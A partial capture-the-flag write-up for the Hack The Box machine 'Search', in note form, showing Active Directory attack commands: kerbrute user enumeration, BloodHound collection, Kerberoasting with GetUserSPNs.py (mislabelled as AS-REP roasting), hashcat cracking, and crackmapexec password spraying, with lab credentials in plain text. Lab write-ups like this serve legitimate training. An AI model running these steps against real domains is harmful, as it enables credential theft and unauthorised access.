# Search
```
10.10.11.129
```


Hostname: `RESEARCH`
Domain name: `search.htb`

kerbrute found some valid user names:

```
administrator@search.htb
research@search.htb
```

Hope Sharp
IsolationIsKey?

Using different permutations of her name in a wordlist combined with `kerbrute` we were able to find a valid username of `hope.sharp`

![[Pasted image 20220712230945.png]]

Then we run bloodhound

```
bloodhound-python -u hope.sharp -p "IsolationIsKey?" -d search.htb -ns 10.10.11.129
```

we then pull this into bloodhound and find an account that is vulnerable to AS-REP Roasting

```
GetUserSPNs.py search.htb/hope.sharp:"IsolationIsKey?" -outputfile web_svc_kerberos
```

and then crack the hash

```
hashcat web_svc_kerberos /usr/share/wordlists/rockyou.txt
```

Which give us the following set of creds.

```
web_svc
```

```
@3ONEmillionbaby
```

Now we have a list of users in bloodhound. We did some magic with powershell to extract the usernames:

start powershell
```
pwsh
```

import the users.json file
```
$json = gc ./20220712232201_users.json | ConvertFrom-Json
```


pull out the username and strip the `@search.htb`, save this to a file `users-ad.txt`
```
$json.data.Properties.name |%{$_.split("@")[0]} | Sort-Object -Unique > users-ad.txt
```

Then we check the username list for password reuse:

```
crackmapexec smb search.htb -u users-ad.txt -p "@3ONEmillionbaby"
```

It looks like `EDGAR.JACOBS` is using the same password.

We then use bloodhound to see what transitive object controlls this user has

![[Pasted image 20220713000236.png]]

We see Edgar has access to the `Helpdesk` share

```
crackmapexec smb search.htb -u edgar.jacobs -p "@3ONEmillionbaby" --shares
```

![[Pasted image 20220713000621.png]]

